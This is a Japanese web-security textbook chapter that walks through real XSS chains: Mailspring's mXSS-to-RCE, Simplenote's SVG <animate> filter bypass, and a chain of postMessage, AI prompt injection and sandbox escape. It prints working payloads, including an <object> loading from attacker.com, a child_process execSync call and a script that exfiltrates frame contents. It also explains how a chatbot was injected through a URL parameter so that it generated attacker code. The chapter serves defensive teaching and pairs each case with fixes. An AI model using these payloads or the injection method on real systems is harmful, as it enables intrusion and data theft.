XSS対策の文脈で言えば、「Shadow DOM内にレンダリングしているから、たとえXSSが起きても閉じ込められる」という設計判断は誤りであり、根本的な対策（適切なサニタイズ、CSP、テンプレートエンジンでの自動エスケープ）を代替するものではない、という点が本節全体を通じた重要な教訓である。

> 出典: 渋谷.XSS techtalk #13 — https://speakerdeck.com/masatokinugawa/shibuya-dot-xss-techtalk-number-13

---

## 実例（Sonar Mailspring / Simplenote Stored XSS）

本節では、実世界で報告された2件の事例を通じて、これまでの章で学んだmXSS（mutation XSS、変異型XSS）、サニタイザ回避、Electronアプリの権限モデルといった知識がどのように組み合わさって実際の被害につながるかを見ていく。1件目はメールクライアント「Mailspring」でDOMPurifyのサニタイズをmXSSで突破し、最終的にOSコマンド実行（RCE）まで到達したチェーン、2件目はメモアプリ「Simplenote」でSVGの`<animate>`要素を悪用してMarkdownサニタイザを迂回したStored XSS（永続型XSS。攻撃者の入力がサーバー等に保存され、後から閲覧した被害者のブラウザで実行される種類のXSS）である。

なお、本節では脆弱性の「仕組み」と「原理」の解説に徹し、他者の環境に対して即座に悪用できる完成された攻略手順（攻撃対象を指定した実行コマンド列など）は記載しない。

---

### 1. Mailspring：mXSSからRCEへの攻撃チェーン

#### 対象と基本情報

- **対象ソフトウェア**: Mailspring（Electron製のクロスプラットフォームメールクライアント）
- **CVE**: CVE-2023-47479
- **影響バージョン**: 1.10.8以前
- **修正バージョン**: 1.11.0（ただしCSPの強化のみで、根本原因であるサニタイズ処理自体は修正されていないと筆者は指摘している）
- **公開日**: 2024年3月11日
- **著者**: Yaniv Nizry（Sonar社の脆弱性リサーチャー）
- **報告から公開までの経緯**: 2023年4月27日にベンダーへ報告、7月4日に確認応答、7月29日にCSP強化パッチが実装されたが、根本的なサニタイズ処理の欠陥については開発側からの反応が得られないまま2024年3月に公開された

> 出典: Reply-To: Calc() — The Attack Chain to Compromise Mailspring — https://www.sonarsource.com/blog/reply-to-calc-the-attack-chain-to-compromise-mailspring/

この事例が重要なのは、「メールを開いただけ」（クリックなどの追加操作が不要）でトリガーされる初期段階から、最終的にOS上で任意コマンドを実行するところまで、複数の弱点を鎖のようにつなげている点にある。単体では大したことのない弱点（サニタイザのわずかな解釈違い、CSPの設定漏れ、Electronの古い設定）が積み重なることで、深刻度が跳ね上がることを示す典型例である。

#### ステップ1：mXSSでサンドボックスiframeを突破する

Mailspringはメール本文をレンダリングする際、まずDOMPurify（HTMLをホワイトリスト方式で無害化するJavaScriptライブラリ）でサニタイズし、それをサンドボックス化された`iframe`内に表示する。ここで使われたペイロードが次のものである。

```html
<svg><style><a title="</style><img src=x onerror='alert(1)'>">
```

**なぜこれが動くのか（mXSSのメカニズム）**

mXSSとは、「サニタイザがDOMに変換して検査した時点では無害に見えるのに、そのDOMを文字列に戻して再度別のパーサーで解釈させたときに、意味が変わって有害なコードが出現する」というクラスの脆弱性である（詳しくは第4章のmXSS解説を参照)。このペイロードでは次のようなパーサーの「解釈のズレ」が使われている。

1. ブラウザ（およびDOMPurifyの内部で使われる`DOMParser`）は、SVG内の`<style>`要素を「foreign content」（HTML文書の中に埋め込まれた別言語の領域。SVGやMathMLなど）として扱う。foreign content内では、HTMLの通常の構文規則とは異なる特殊なパースルールが適用される。
2. `<style><a title="</style>...">`という文字列がこの特殊ルールのもとで解釈されると、`title`属性の値としてブラウザが認識する範囲がHTML的な直感とはズレる。結果として、DOMPurifyが構築した内部DOM木の時点では、`<img src=x onerror=...>`のような危険な部分は「`<style>`要素内のテキストデータ」または「属性値の一部」として無害に扱われ、削除・エスケープの対象から外れてしまう。
3. その後、サニタイザが不要な`<svg>`タグ自体を（許可されていないタグとして）別のタグに置き換えたり削除したりする処理を行う。しかしこのとき、内部に埋め込まれていた文字列データ自体は変更されずに保持される。
4. 最終的にそのDOM木を`innerHTML`としてシリアライズ（文字列化）し、実際の表示用DOMに挿入し直すと、周囲の構造が変わったことで、先ほどまで「ただの文字列」だった部分がブラウザの通常のHTMLパーサーによって再解釈され、`<img src=x onerror='alert(1)'>`という実行可能なタグとして復活する。

これが「サニタイズ後のデータをもう一度加工・再解釈する（記事内で"Desanitization"と呼ばれている操作）ことの危険性」であり、Sonarのブログはこれを本脆弱性チェーンの起点として位置づけている。この段階のペイロードはサンドボックス化された`iframe`内で実行されるため、直接的な被害はまだ限定的である（`iframe`の`sandbox`属性により、親ウィンドウのDOMやNode.js APIには到達できない）。

#### ステップ2：返信・転送時の二次サニタイズ回避

メールクライアントでは、受信メールに返信・転送すると、元の本文が新しいメールの下部に引用として挿入される。Mailspringではこの引用挿入の際に、独自のカスタムタグ（`<signature>`など、署名やクオート部分を表すために使われるタグ）でラップした上で、再度サニタイズ処理を通す実装になっていた。攻撃者は、1段階目のmXSSペイロードをこのカスタムタグの内部に配置しておくことで、この2回目のサニタイズ処理でも検出をすり抜けるよう調整した。

```html
<svg><style><a title="</style><signature>
<object data='https://attacker.com/payload'></object>
</signature>">
```

ここで`<object>`要素が使われている点が重要である。Mailspring側のContent-Security-Policy（CSP。第4章で学んだ、ブラウザに対してどの種類のリソースをどこから読み込んでよいかを指示するHTTPヘッダ/meta要素）の設定が`default-src *`のように緩く、`object-src`が明示的に制限されていなかったため、外部サーバーから任意のコンテンツを読み込む`<object>`タグが実行可能だった。CSPは各ディレクティブ（`script-src`、`object-src`など）ごとに許可元を指定する仕組みであり、`default-src`だけを設定して個別ディレクティブを省略すると、その個別ディレクティブは`default-src`の値を継承してしまう。ここでは`default-src *`（任意のオリジンを許可）が実質的に「何でも許可」になっており、CSPが機能していなかった。

#### ステップ3：ローカルファイルパスの外部への抽出（CSS Exfiltration）

返信メール中で読み込まれた`<object>`は、攻撃者のサーバーへ接続することで、被害者側の情報を外部に持ち出す（exfiltrate、外部に抜き出す）ための足がかりになる。ブログで説明されている手法は、インライン画像（メール内に埋め込まれた添付画像。`cid:`スキームで参照される）のローカルファイルパスをCSSセレクタや属性セレクタと組み合わせて、その値の一部を段階的に外部サーバーへ送信する、CSS injectionでよく使われる「exfiltration（抜き出し）」のテクニックである。これにより攻撃者は、被害者のローカルディスク上でMailspringが管理しているファイルの正確なパス（例えば`.Mailspring`という設定ディレクトリ以下のファイルパス）を特定できるようになる。

#### ステップ4：`file://`スキームを使ったRCEへのエスカレーション

パスが判明したら、攻撃者は2通目のメールで次のようなペイロードを送る。

```html
<object data='file:///Users/.../.Mailspring/files/[抽出したパス]'>
```

この`<object>`は、先ほど特定したローカルファイル（攻撃者があらかじめ細工しておいたHTMLファイル）を`file://`スキームで読み込む。ここでElectronアプリ特有の設定不備が効いてくる。

**なぜ`file://`の読み込みが致命的なのか**

MailspringはElectron 17.4.0上に構築されており、記事の指摘によれば`nodeIntegration: true`かつ`contextIsolation: false`という設定でレンダラープロセスが動いていた。これは第4章のDOM Clobbering/プロトタイプ汚染の文脈でも触れた「レンダラーの権限分離」に関わる設定である。

- `nodeIntegration: true`は、本来ブラウザのWebページには存在しないはずのNode.js API（ファイルシステム操作、子プロセス起動など）を、レンダラー内のJavaScriptから直接呼び出せるようにする設定である。
- `contextIsolation: false`は、Electronが用意するメインワールドとアイソレートワールドの分離を無効化し、ウェブコンテンツ（メール本文など、信頼できない外部由来のHTML/JS）が、アプリ本体のJavaScriptコンテキストに直接アクセスできる状態を作る。

さらに、`file://`スキームで読み込まれたコンテンツは、ブラウザの同一オリジンポリシー上、同じ`file://`スキームの他のコンテンツと「同一オリジン」とみなされる場合がある。攻撃者が用意したHTMLファイルが読み込まれると、そのスクリプトはアプリのメインウィンドウ（Node.js統合が有効な、より高い権限を持つコンテキスト）に対して、

```javascript
top.require('child_process').execSync('open -a Calculator')
```

のような呼び出しを行える状態になる。`require('child_process')`はNode.jsの標準モジュールで、任意のOSコマンドを子プロセスとして起動できる。つまり、ブラウザのタブの中に閉じ込められているはずのJavaScriptが、Node.jsのフルAPIにアクセスできてしまい、結果としてOSコマンド実行（RCE、Remote Code Execution）に到達する。ブログのタイトル「Reply-To: Calc()」は、実際にこの手法で電卓アプリ（Calculator、`calc`）を起動できたことに由来する、セキュリティ研究業界でお馴染みの「PoC（概念実証）としてまず電卓を起動する」という慣習を踏まえたものである。

もう一つの手段として、記事はCVE-2022-1364（Electronが同梱していた古いChromiumバージョン、Chrome 98.0.4758.141に存在したV8エンジンの脆弱性）を使い、既存のパブリックなエクスプロイトをそのまま適用してサンドボックスを突破する経路も挙げている。これはElectronアプリが内部のChromiumを最新に保っていない場合、ブラウザ本体のn-day脆弱性（公開済みだが未パッチの脆弱性）がそのままアプリの攻撃対象になり得ることを示す一般的な教訓でもある。

#### 修正状況と防御策

Mailspring 1.11.0では、CSPを次のように強化する対応が取られた。

```
object-src none; media-src mailspring:; manifest-src none;
```

`object-src none`により`<object>`/`<embed>`要素の実行が禁止され、この特定のチェーンにおける「悪意あるファイルの読み込み」経路が塞がれた。しかしブログは、根本原因であるDOMPurify出力の再解釈（mXSSそのもの）は未解決のままだと指摘している。これは、パッチが「攻撃チェーンの1つの環（CSP不備）」だけを塞いだものであり、「サニタイズ済みHTMLをその後どう扱うか」という設計上の問題自体には手を付けていない、という点で重要な教訓を含む。

Sonarが提示する一般的な防御指針は次の通りである。

1. **Desanitization（サニタイズ済みデータの再加工）を避ける**: いったんDOMPurifyなどで無害化した出力を、別のテンプレートに埋め込み直したり、別のタグでラップしてから再度DOM操作したりしない。サニタイズは「最後の一手」として、実際にDOMへ挿入する直前に一度だけ行うのが安全である。
2. **Electronのセキュリティベストプラクティスを遵守する**: `nodeIntegration`を無効化し、`contextIsolation`を有効化し、外部由来のコンテンツで`file://`プロトコルを扱わない。
3. **CSPを正確に設定する**: `default-src`任せにせず、`object-src none`など個別ディレクティブを明示する。

Sonar社は自社の静的解析ルール（S5728、`default-src`のCSPディレクティブ設定を検証するルール）でこの種の設定不備を検出できるとしている。また、同記事内ではProtonMail、Tutanota、Skiffといった他のWebメール/デスクトップメールクライアントでも類似の脆弱性が確認されたと言及されている。

---

### 2. Simplenote：SVG `<animate>`によるMarkdownサニタイザ回避（Stored XSS）

#### 対象と基本情報

- **対象ソフトウェア**: app.simplenote.com（Automattic社が運営するメモアプリ）
- **HackerOneレポート**: #271007「[app.simplenote.com] Stored XSS via Markdown SVG filter bypass」
- **報告者**: ysx
- **報告日**: 2017年9月22日
- **修正日**: app.simplenote.com上で2017年9月26日ごろに修正、公開（disclose）は2017年11月12日
- **対応**: Automattic社のセキュリティチーム（vortfu、roundhillなどが対応）により迅速に修正され、報奨金（バウンティ）の対象として認定された

> 出典: Automattic | Report #271007 - [app.simplenote.com] Stored XSS via Markdown SVG filter bypass | HackerOne — https://hackerone.com/reports/271007

#### 脆弱性の概要

Simplenoteは「Markdown Formatted」オプションを有効にすると、ユーザーが書いたMarkdown記法のノートをHTMLに変換して表示する機能を持つ。この変換処理の過程で生成されるHTMLは、当然ながらサニタイザ（このケースではDOMPurifyが使われていたとされる）を通してから表示用DOMに挿入される。ところが、SVGの`<animate>`要素を使った特定の記法により、このサニタイザの判定をすり抜け、任意のJavaScriptを実行できることが確認された。

再現手順は次の通りである。

1. app.simplenote.comにログインし、新規ノートを作成する。
2. 「Markdown Formatted」オプションを有効化する。
3. 編集画面に細工したSVGペイロードを貼り付ける。
4. 右上のメニューから「Publish（公開）」を選択する。
5. 公開されたノートのURLにアクセスすると、Stored XSSとしてペイロードが実行される。

使われたペイロードは次のようなものである。

```html
<svg>
<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="?">
  <circle r="400"></circle>
  <animate attributeName="xlink:href" begin="0"
           from="javascript:alert(document.domain)" to="&" />
</a>
</svg>
```

**なぜこれが動くのか（SVG `<animate>`によるフィルタ回避の仕組み）**

SVGの`<animate>`要素は、本来「グラフィックの属性値を時間経過とともに変化させる」ためのアニメーション機能である。ここで使われている属性は次の意味を持つ。

- `attributeName="xlink:href"`: アニメーション対象となる属性を指定する。ここでは`<a>`要素の`xlink:href`（SVG 1.1におけるリンク先URLを表す属性。HTMLの`href`に相当）が対象に指定されている。
- `from` / `to`: アニメーションの開始値と終了値を指定する。

このペイロードの核心は、**多くのHTMLサニタイザが、静的なタグ・属性の組み合わせ（例えば`<a href="javascript:...">`のような直接的な記述）をブラックリスト/ホワイトリストで検査する一方で、`<animate>`要素の`attributeName`・`from`・`to`のような「間接的にどの属性がどんな値になるか」を実行時に決定する仕組みまでは正しく検査していなかった**点にある。

サニタイザが素朴に「`<a>`要素の`href`/`xlink:href`属性の値に`javascript:`が含まれていないか」だけをHTML文字列やDOM属性値として直接チェックしていた場合、この記法ではその時点での`xlink:href`属性の実際の値は無害な`"?"`のままである。危険な`javascript:alert(document.domain)`という文字列は、`<animate>`要素の`from`属性という、一見無関係な場所に格納されている。サニタイザの検査ロジックがこの`from`/`to`属性の値までは危険視していなかった、あるいは`attributeName`で動的に上書きされる属性の組み合わせを想定していなかったために、この文字列がフィルタを通過してしまう。

ページがブラウザ上でレンダリングされると、SVGアニメーションエンジンが`<animate>`要素の指示に従い、`begin="0"`（ページ読み込み直後、あるいは要素表示直後にアニメーションを開始）というタイミングで、`xlink:href`属性の値を実際に`from`の値である`javascript:alert(document.domain)`へと書き換える。この結果、あたかも最初から`<a xlink:href="javascript:alert(document.domain)">`と書かれていたのと同じ状態がDOM上で発生し、そのリンク（またはSVG内の対応する図形要素）がクリックされる、あるいはブラウザの実装によっては自動的に評価されるタイミングで、`javascript:`スキームのコードが実行される。

これは、後にPortSwiggerの研究(SVG animate XSS vector)でも体系的にまとめられた手法と同系統のものである。その研究では、`values`属性内に複数の値をセミコロン区切りで並べて`javascript:`文字列を分割・難読化したり、`keyTimes`/`repeatCount="indefinite"`でアニメーションを無限ループさせて常に悪意ある値が適用され続けるようにしたりする、より発展した亜種も報告されている。共通する原理は同じで、「属性値そのものを直接書くのではなく、SVGのアニメーション機構を介して間接的に危険な属性値を生成させる」ことで、静的な文字列パターンマッチや単純なDOM属性チェックに依存したサニタイザを回避する、というものである。

#### 防御策

この種の攻撃に対する根本的な対策は次の通りである。

1. **サニタイザ自体を信頼できる実装にアップデートする**: DOMPurifyのような主要なサニタイザは、この種のSVGアニメーション経由の間接攻撃が報告されるたびに、`<animate>`・`<animateTransform>`・`<set>`などのアニメーション系タグ、および`attributeName`でセンシティブな属性（`href`、`xlink:href`など）を指定するケースを個別にブロックするよう改修されてきた。実際にDOMPurifyのIssueトラッカーでは、この種のSVGアニメーションによるサニタイズ回避が継続的に報告・修正されている。ライブラリを最新版に保つことが最も基本的かつ有効な対策である。
2. **不要な機能を持つ入力ソースそのものを許可しない**: Markdown変換のようにHTMLを生成する経路では、そもそも「SVGタグそのものの使用」が本当に必要な機能かどうかを見直し、必要でなければSVG関連タグ・属性を許可リストから除外する、という設計判断も有効である。
3. **`javascript:`スキームを属性値の生成後（実行時）にもチェックする**: 静的なHTML文字列やDOM属性の初期値だけでなく、CSPの`script-src`制限や、ブラウザ側のより厳格なURLスキーム制限（例えば`<a>`要素で`javascript:`スキームのリンクそのものをブロックする実装）を組み合わせることで、多層的に防御する。

---

### 2つの事例から得られる教訓

この2つの事例には、扱っているアプリの種類（デスクトップのElectronメールクライアント／Webのメモアプリ）もペイロードの技術的な形も大きく異なるが、共通する本質的な教訓がある。

- **サニタイザは万能ではない**: DOMPurifyのような十分に実績のあるライブラリを使っていても、パーサーの解釈差（Mailspringのfor eign contentを利用したmXSS）や、属性の動的な書き換え（Simplenoteの`<animate>`による間接攻撃）のような、サニタイザの検査ロジックが想定していない経路が存在しうる。サニタイズは「多層防御の1層」であって、それ単体で安全性を保証するものではない。
- **サニタイズ済み出力の再利用・再加工は危険**: Mailspringの事例が示すように、一度サニタイズしたHTMLを別のテンプレート（`<signature>`タグなど）に埋め込み直して再度処理する設計は、mXSSのリスクを増幅させる。サニタイズは実際にDOMへ挿入する直前の「最後の一手」にすべきである。
- **単体の脆弱性より「チェーン」を評価する**: Mailspringの事例では、mXSS単体・CSP設定不備単体・Electronの権限設定単体は、それぞれ個別に見ればある程度限定的な問題に見えるかもしれない。しかしこれらを鎖のようにつなげることで、メールを見ただけでOSコマンド実行に至るという重大な結果に発展した。防御側は個々の弱点だけでなく、それらが組み合わさったときの経路（attack chain、攻撃チェーン）を評価する必要がある。
- **Electronのようなハイブリッドアプリ特有のリスク**: ブラウザ内で完結するWebアプリのXSSは通常「そのオリジンの中」に被害が留まるが、Node.js統合を持つデスクトップアプリでは、同じ種類のXSSがOSレベルの権限にまで直結しうる。デスクトップアプリ開発者は、ウェブコンテンツをレンダリングする箇所には常にブラウザと同等以上の権限分離（`contextIsolation`、`sandbox`、`nodeIntegration: false`)を適用すべきである。

---

## 複合連鎖と実務的な発見手法

これまでの章では、反射型・格納型・DOM-basedといった「単体のXSS」を扱ってきた。しかし実際のバグバウンティやレッドチーム演習で最も高額な報奨や最も深刻なインパクトを生むのは、**単体では中程度の重大度にしかならない複数の弱点を鎖のようにつなぐ（chain）ことで、初めてXSSやデータ漏洩に到達するケース**である。本節では、(1) `postMessage` の誤設定・AIプロンプトインジェクション・サンドボックス脱出を組み合わせた実例、(2) 熟練した研究者がXSSを「どうやって見つけているか」という実務的な方法論、の2つを軸に解説する。

### 6.4.1 なぜ「連鎖」が重要なのか

単一の脆弱性は、開発側も脆弱性スキャナも比較的発見しやすい。しかし以下のような組み合わせは、個々のパーツを別々にレビューしても気づかれにくい。

- **origin検証の欠落**（`postMessage` のリスナーが送信元を確認していない）
- **サンドボックス化されたコンテキスト**（`iframe sandbox` 属性やAIエージェントの「安全なはずの」実行環境）
- **信頼境界をまたぐ入力**（AIモデルへのプロンプト、他ウィンドウからのメッセージ）

これらは個別に見ると「情報漏洩の可能性がある設定ミス」「モデルの応答がおかしくなる程度の問題」「iframeの分離がやや甘い」といった、単体ではCVSSスコアが中程度に留まりがちな指摘になる。ところが、送信元検証がないpostMessageハンドラに、プロンプトインジェクションで生成した悪意あるHTML/JSペイロードを流し込み、そのハンドラがサンドボックス外のDOM操作を許してしまう——という具合に**出力が次の脆弱性の入力になる**形で鎖をつなぐと、最終的に任意コード実行（XSS）とデータ窃取に到達する。これは「複合脆弱性（chained vulnerability）」と呼ばれ、近年のバグバウンティレポートで急増している攻撃パターンである。

### 6.4.2 postMessage誤設定 × AIプロンプトインジェクション × サンドボックス脱出

以下は、研究者 Source_To_Sink 氏が2026年3月にInfoSec Write-upsへ投稿した実例（対象はAIチャット/ドキュメント処理を行うプラットフォーム。企業名・URLは記事内で `[REDACTED]` 表記）を、原文の構造に沿って再構成したものである。単発の脆弱性としては「中程度」にしか評価されない3つの弱点——**postMessageの誤設定**、**AIプロンプトインジェクション**、**サンドボックス脱出**——を組み合わせることで、任意のJavaScript実行と機微データの持続的な持ち出し（exfiltration）にまで到達している。

#### 背景: postMessageとサンドボックスの基本原理

`window.postMessage()` は、異なるオリジン（プロトコル・ホスト・ポートの組が異なるページ）間で安全にメッセージをやり取りするためのAPIである。受信側は次のように実装するのが正しい。

```js
window.addEventListener('message', (event) => {
  if (event.origin !== 'https://trusted.example.com') return; // origin検証
  handleMessage(event.data);
});
```

`event.origin` の検証を怠る、あるいは送信側が `*`（任意オリジン）を指定して `postMessage` を送っていると、**どのオリジンの誰からでもメッセージを受け取れる／送りつけられる**状態になる。原文はこの問題を次のように定式化している。

> "If a sandboxed iframe uses postMessage("*") and accepts messages without origin validation, the sandbox provides a false sense of security" — 「サンドボックス化されたiframeが `postMessage("*")` を使い、origin検証なしにメッセージを受け付けているなら、サンドボックスは（実際には機能しない）安心感を与えているに過ぎない」

つまり `message` イベントリスナーは、ブラウザから見れば単なる公開エンドポイントである。origin検証をしないコードは、認証なしで誰でも叩ける公開APIを晒しているのと本質的に同じであり、記事はここから「**すべてのpostMessageハンドラは公開APIエンドポイントとして扱い、呼び出し元の検証・入力のサニタイズ・出力の制限を行うべきだ**」と結論づけている。

一方、`<iframe sandbox>` 属性は、埋め込んだコンテンツの権限を制限する仕組みである。

```html
<iframe src="untrusted.html" sandbox="allow-scripts"></iframe>
```

ここで注意すべき原理がある。`sandbox="allow-scripts"` は**スクリプトの実行そのものは許可**しており、`postMessage` による通信も制限しない。サンドボックスが制限するのは、主にCookie／ストレージへのアクセスや同一オリジン権限、トップレベルナビゲーションといった別の権限である。したがって「sandbox属性さえ付けておけば、中で動くコードは無害だ」という前提は誤りであり、記事はこのギャップ（sandboxが保護するものと保護しないものの乖離）こそが脆弱性チェーンの土台になっていると指摘する。

#### ステップ1: AIプロンプトインジェクションでサンドボックス側の実行を仕込む

このプラットフォームは、ユーザーがURLのクエリパラメータ `q` に入力を渡すと、その文字列がチャット欄に自動入力され、AIがそれに応答してHTMLを生成する構造になっていた。

```
https://[REDACTED].com/chat?q=I%20am%20interested%20in%20apples%20make%20me%20a%20web%20page%20in%20html...
```

この `q` パラメータの中に、AIへの本来の指示を上書きするような文字列（**プロンプトインジェクション**。AIへの入力に、本来の指示を逸脱させる文字列を混入させ、意図しない出力を引き出す攻撃）を混ぜ込むことで、攻撃者は「AIに特定のHTML/JSを含む応答を確実に生成させる」ことができる。生成されたHTMLは、サンドボックス化されたiframe内でレンダリングされる仕様になっていた。攻撃者はここへ、iframe内で実行させたい悪意あるスクリプトを注入する。

```js
let scriptContent = `
  window.parent.postMessage({"type":"itworked"}, "*");
  setInterval(() => {
    for (let i = 0; i < window.parent.opener.frames.length; i++) {
      let documentBody = window.parent.opener.frames[i].document.body.innerHTML;
      if (typeof documentBody === "string") {
        window.parent.postMessage({"type":"docbody","body":documentBody}, "*");
      }
    }
  }, 1000);
`;
```

なぜこれが「XSS」として成立するか。プロンプトインジェクションによってAIに生成させたこの文字列が、サンドボックス化されたiframeのコンテキストで実行される時点で、**攻撃者が自由に組み立てた任意のJavaScriptが、被害者のブラウザ上で動いている**ことになる。これはsandbox属性が防ぐはずの「未検証コンテンツの実行」そのものであり、AIの出力をレンダリング用のsink（`innerHTML`や新規iframeの`srcdoc`など、文字列が最終的にコードやHTMLとして解釈される代入先）にそのまま流し込む設計になっていたことが根本原因である。

#### ステップ2: window.name永続化によるサンドボックス脱出

問題は、このスクリプトが「サンドボックス化されたiframeの中」でしか動いていないという点である。サンドボックスの中だけであれば、被害範囲はそのiframe自身のDOMに限られるはずだった。ここで使われたのが、ブラウザの**`window.name`永続化**という古典的な性質である。

`window.name` はウィンドウ（タブ）に紐づく文字列プロパティで、**そのウィンドウが別のオリジンへナビゲート（遷移）しても値が保持される**という、後方互換性のために維持されてきた挙動を持つ。原文はこれを次のように説明している。

> "window.name persists across navigations, and browsers maintain this behavior for backward compatibility" — 「`window.name`はページ遷移をまたいで保持され、ブラウザはこの挙動を後方互換性のために維持している」

攻撃者はこの性質を利用し、複数のウィンドウ間でのオリジンをまたいだ参照関係を構築する。攻撃フローは次の通りである。

1. **ウィンドウA**（攻撃者ページ、`first.html`）: 事前に `window.name = "Baymax"` を設定しておく。
2. ウィンドウA上の「Loginボタン」のようなUI要素をユーザーにクリックさせ、`second.html` を開く（**ウィンドウB**）。
3. ウィンドウB内で `window.open("https://[REDACTED].com/chat?q=...", "Baymax")` を実行する。第2引数にウィンドウ名 `"Baymax"` を指定して `window.open()` を呼ぶと、ブラウザは**同じ名前を持つ既存のウィンドウ（ここではウィンドウA）を再利用してそこへナビゲートする**という仕様がある。これによりウィンドウAは被害者のプラットフォームのチャットページへ強制的に遷移させられるが、`window.name` の値 `"Baymax"` 自体は保持されたままになる。
4. ウィンドウAは今やターゲットプラットフォームのページであり、その中にステップ1で仕込んだプロンプトインジェクション経由のAI応答が読み込まれ、サンドボックスiframe（0番目のフレームなど）としてレンダリングされる。
5. ウィンドウBは `window.opener` （自分を開いた元のウィンドウへの参照）経由でウィンドウAにアクセスできる。すなわち `window.opener.frames[0]` のようにして、**別オリジンであるはずのターゲットページ内のサンドボックスiframeへの参照を、攻撃者が完全に制御するウィンドウBから直接手繰り寄せられる**ことになる。

この一連の流れが成立する理由は、`window.name` の永続化、`window.open()` の名前付きウィンドウ再利用、そして `window.opener`/`frames` によるフレーム階層トラバーサル（`window.parent`・`window.top`・`window.opener`・`frames` を辿って、本来は直接アクセスできないはずの別のウィンドウ／フレームの参照を得る操作）という、いずれも仕様上正当なブラウザ機能を**組み合わせて使う**ことで、サンドボックスの権限境界を実質的に迂回している点にある。サンドボックス属性そのものにバグがあるわけではなく、「サンドボックスの外側にある、ブラウザの正規のクロスウィンドウ機構」を踏み台にしているのが本質である。

#### ステップ3: origin未検証のpostMessageによるデータ持ち出し

サンドボックス内で実行されているスクリプト（ステップ1のペイロード）は、1秒ごとに `window.parent.opener.frames[i].document.body.innerHTML` を読み取り、`postMessage({"type":"docbody","body":documentBody}, "*")` として送信し続ける。受信側（攻撃者が用意したページ、あるいは前述のウィンドウA/B）がこの `message` イベントをリッスンしていれば、送信元のorigin検証がない限りメッセージを受理してしまう。

```js
// 送信側: ワイルドカードOriginを使用
window.parent.postMessage({ type: "docbody", body: htmlBody }, "*");

// 受信側: Origin検証がない
window.addEventListener("message", (event) => {
  if (event.data.type === "start-received") {
    renderContent(event.data.input, event.data.language);
  }
});
```

第二引数に `"*"` を指定して送信すると、**そのメッセージはどのオリジンで動いているリスナーにも届いてしまう**（送信側のorigin制限）。加えて受信側も `event.origin` を確認していないため（受信側のorigin検証欠落）、この2つが揃うことで、攻撃者が完全に制御するページが、被害者のブラウザ内で継続的に生成される機微情報（アップロードされたドキュメントの内容、AIの生成レスポンス、会話履歴など）を**リアルタイムで盗聴し続けられる**状態が成立する。`setInterval` によって1秒ごとにポーリングしているため、被害者がページを開いている間、情報漏洩は持続的に発生する。

#### なぜ「サンドボックスがあるから安全」という前提が崩れるのか

原文が強調しているのは、`sandbox` 属性が保護する範囲と、この攻撃チェーンが突いた範囲がそもそも一致していないという点である。`sandbox="allow-scripts"` はスクリプト実行そのものは止めず、`postMessage` 通信も制限しない。加えて `window.opener` 経由の参照は、`sandbox` 属性の制約とは別の仕組み（ウィンドウ間の開設者参照）であるため、サンドボックス設定だけでは塞げない。これが「個別には中程度の3つの弱点が、鎖として繋がると重大なインパクトになる」理由である。

#### 修正方法

**Fix 1: origin検証を許可リストとの厳密一致で行う**

```js
const ALLOWED_ORIGINS = [
  "https://[REDACTED].com",
  "https://www.[REDACTED].com"
];
window.addEventListener("message", function(event) {
  if (!ALLOWED_ORIGINS.includes(event.origin)) {
    console.warn("Rejected message from unauthorized origin:", event.origin);
    return;
  }
  // 処理続行
});
```

**Fix 2: 受け取ったHTMLは必ず無害化する**

```js
const sanitized = DOMPurify.sanitize(content, {
  FORBID_TAGS: ['script', 'iframe', 'object', 'embed'],
  FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover']
});
```

**Fix 3: `postMessage` の送信先は必ず明示のオリジンにする**

```js
iframe.contentWindow.postMessage(data, "https://cdn.example.cloudfront.net");
```

`"*"` を使わず送信先オリジンを固定すれば、意図しないオリジンにメッセージが漏れることはなくなる。

**Fix 4: `window.name` を悪用したクロスウィンドウ攻撃への対策**

```js
// Cross-Origin-Opener-Policy: same-origin ヘッダーが最も効果的
if (window.name) {
  window.name = "";
}
```

`Cross-Origin-Opener-Policy: same-origin` を送出すると、クロスオリジンのウィンドウ間で `window.opener` 参照自体が切り離されるため、ステップ2で示したフレーム階層トラバーサルの起点を断つことができる。ページ側で不要な `window.name` を明示的にクリアすることも補助的な対策になる。

#### 実務者への教訓

記事が繰り返し強調しているのは、**単体の弱点を見つけて終わりにしない**という視点である。原文の結論を要約すると次のようになる。

- postMessage誤設定（origin検証欠落）を見つけたら、それ単体のバグとして報告するだけでなく、AIプラットフォームであればプロンプトインジェクションと、iframeがあればサンドボックス脱出の可能性と、組み合わせられないかを必ず検討する。
- `window.name` の永続性は、あるページで値を仕込んでおき、被害者が全く別のオリジンへ遷移した後もその値を読み出せるという、クロスウィンドウでの標的化に使える古典的だが見落とされやすい手法である。
- `window.top`・`window.parent`・`window.opener` を辿るフレーム階層トラバーサルは、本来到達できないはずの上位・関連フレームのコンテキストへスコープを拡大する定石であり、postMessageの検証漏れと組み合わせると威力が増す。
- 「個別には中程度の脆弱性が、連鎖することで重大な侵害を実現する」——バグバウンティのトリアージにおいても、単一issueのCVSSだけでなく、他の既知の弱点との組み合わせ可能性を評価する視点が要求される。

> 出典: PostMessage Misconfiguration + AI Prompt Injection + Sandbox Escape = XSS & Data Exfiltration（Source_To_Sink, InfoSec Write-ups, 2026年3月） — https://infosecwriteups.com/postmessage-misconfiguration-ai-prompt-injection-sandbox-escape-xss-data-exfiltration-d1d29821a2de

### 6.4.3 実務者はどうやってXSSを見つけているか

続いて、単発の脆弱性探しの「型」に話を移す。ここではHackerOneが2026年4月に公開した実務者向けガイド（著者: Haoxi Tan, Security Researcher）の要点を紹介する。

記事はまず、Cross-Site Scripting（XSS）を「被害者のブラウザ上で任意のJavaScriptを実行させる、Webアプリケーションで一般的な脆弱性の一種」と定義した上で、反射型・格納型・DOM-basedという基本3分類に加えて、**ブラインドXSS（Blind XSS, bXSS）**や、PDF・Electronアプリのような「異例の場所」に現れるXSSも実務では頻出すると指摘し、発見のための具体的な手法とツールを提示している。

#### (1) ポリグロットペイロードによる網羅的プロービング

**ポリグロット（polyglot）**とは、複数の異なるコンテキスト（HTML属性内、JS文字列内、URL内など）のいずれに挿入されても実行が成立するように設計された、汎用性の高いペイロードを指す。記事が挙げる例は次のようなものである。

```
" onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//
```

